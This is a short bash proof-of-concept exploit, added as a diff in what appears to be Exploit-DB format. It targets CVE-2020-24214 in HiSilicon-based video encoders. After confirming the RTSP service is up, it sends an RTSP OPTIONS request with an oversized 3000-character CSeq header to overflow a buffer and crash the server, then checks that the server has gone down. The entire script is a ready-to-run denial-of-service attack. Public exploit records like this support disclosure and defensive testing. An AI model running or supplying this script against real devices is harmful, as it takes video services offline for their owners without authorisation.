@@ -1,0 +1,43 @@
+#!/usr/bin/env bash
+
+# Exploit Title: HiSilicon video encoders - unauthenticated RTSP buffer overflow (DoS)
+# Date: 2020-09-20
+# Exploit Author: Alexei Kojenov
+# Vendor Homepage: multiple vendors
+# Software Link: N/A
+# Version: vendor-specific
+# Tested on: Linux
+# CVE: CVE-2020-24214
+# Vendors: URayTech, J-Tech Digital, ProVideoInstruments
+# Reference: https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/
+# Reference: https://www.kb.cert.org/vuls/id/896979
+
+
+if [ "$#" -ne 2 ]
+then
+  echo "usage: $0 <server> <RTSP port>"
+  exit 1
+fi
+
+server=$1
+port=$2
+
+printf "checking the target... "
+timeout 2 curl -s rtsp://$server:$port \
+  || { echo "ERROR: no RTSP server found at $server:$port"; exit 2; }
+printf "RTSP server detected\n"
+  
+cseq=$(printf "0%0.s" {1..3000})
+
+printf "sending the payload... "
+printf "OPTIONS /0 RTSP/1.0\nCSeq: %s\n\n" $cseq | telnet $server $port >/dev/null 2>&1
+printf "done\n"
+
+sleep 1
+printf "checking the target again... "
+if timeout 2 curl -s rtsp://$server:$port
+then
+  echo "ERROR: the RTSP server still seems to be running :("
+else
+  echo "SUCCESS: the server is down"
+fi
